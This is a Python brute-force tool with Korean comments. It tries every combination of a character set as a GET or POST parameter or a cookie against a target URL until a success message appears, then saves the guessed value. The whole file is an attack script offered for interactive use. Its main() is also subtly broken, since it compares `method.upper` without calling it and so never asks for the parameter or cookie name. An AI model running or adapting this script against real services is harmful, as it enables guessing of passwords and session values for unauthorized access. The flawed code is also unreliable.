import requests
import itertools
import time
import argparse

def brute_force_request(
    url,
    char_set,
    min_length,
    max_length,
    method="GET",
    password_param=None,
    success_message=None,
    cookies_key=None,
    log_file=None,
    headers=None,
):
    """
    범용 브루트 포스 요청 함수

    Args:
        url (str): 요청 URL
        char_set (str): 시도할 문자 집합
        min_length (int): 최소 길이
        max_length (int): 최대 길이
        method (str): 요청 방식 ("GET", "POST", "COOKIE")
        password_param (str): POST 또는 GET 파라미터 이름
        success_message (str): 성공 메시지
        cookies_key (str): 쿠키 키 이름 (method="COOKIE"일 때 사용)
        log_file (str): 로그 파일 경로 (옵션)
        headers (dict): HTTP 요청 헤더 (옵션)

    Returns:
        str: 성공 시 서버 응답
    """
    print("Brute Force 시작!")
    start_time = time.time()
    attempts = 0

    # 세션 객체 생성
    session = requests.Session()
    if headers:
        session.headers.update(headers)

    # 패스워드 길이별 조합 생성 및 시도
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(char_set, repeat=length):
            attempt = ''.join(combination)
            attempts += 1

            # 요청 데이터 설정
            try:
                if method.upper() == "POST" or method == "2":
                    data = {password_param: attempt}
                    response = session.post(url, data=data)
                elif method.upper() == "GET" or method == "1":
                    params = {password_param: attempt}
                    response = session.get(url, params=params)
                elif method.upper() == "COOKIE" or method == "3":
                    cookies = {cookies_key: attempt}
                    response = session.get(url, cookies=cookies)
                else:
                    print("잘못된 요청 방식입니다. 'GET', 'POST', 'COOKIE' 중 하나를 선택하세요.")
                    return None

                # 로그 파일 기록
                if log_file:
                    with open(log_file, "a") as log:
                        log.write(f"시도: {attempt}\n")

                # 서버 응답 확인
                if success_message in response.text:
                    print(f"\n찾은 값: {attempt}")
                    end_time = time.time()
                    print(f"걸린 시간: {end_time - start_time:.2f}초")
                    print(f"총 시도 횟수: {attempts}")
                    print("================================================")
                    print(response.text)
                    
                    # 결과 파일 저장
                    with open("found_result.txt", "w") as result_file:
                        result_file.write(f"찾은 값: {attempt}\n")
                        result_file.write(f"걸린 시간: {end_time - start_time:.2f}초\n")
                        result_file.write(f"총 시도 횟수: {attempts}\n")
                    return response.text
                else:
                    print(f"시도 중: {attempt} (실패)", end="\r")
            except requests.RequestException as e:
                print(f"\n요청 중 오류 발생: {e}")
                return None

    print("\n값을 찾지 못했습니다.")
    return None

# 사용자 입력 기반 실행
def main():
    url = input("URL: ").strip()
    char_set = input("Char_set: ").strip()
    min_length = int(input("Min_length: ").strip())
    max_length = int(input("Max_length: ").strip())
    method = input("Method (GET, POST, COOKIE): ").strip().upper()
    success_message = input("Success_message: ").strip()
    
    log_file = input("Log_file (option, leave blank for none): ").strip() or None
    headers_input = input("Headers (key1:value1, key2:value2, leave blank for none): ").strip() or None
    headers = {item.split(':')[0].strip(): item.split(':')[1].strip() for item in headers_input.split(',')} if headers_input else None

    # GET/POST 방식에 따른 파라미터 이름
    password_param = None
    if method.upper in ["GET", "POST"]:
        password_param = input("Password_param: ").strip()

    # COOKIE 방식에 따른 쿠키 키 설정
    cookies_key = None
    if method.upper == "COOKIE" or method == "3":
        cookies_key = input("Cookies_key: ").strip()

    # brute force 실행
    brute_force_request(
        url=url,
        char_set=char_set,
        min_length=min_length,
        max_length=max_length,
        method=method,
        password_param=password_param,
        success_message=success_message,
        cookies_key=cookies_key,
        log_file=log_file,
        headers=headers,
    )

if __name__ == "__main__":
    main()
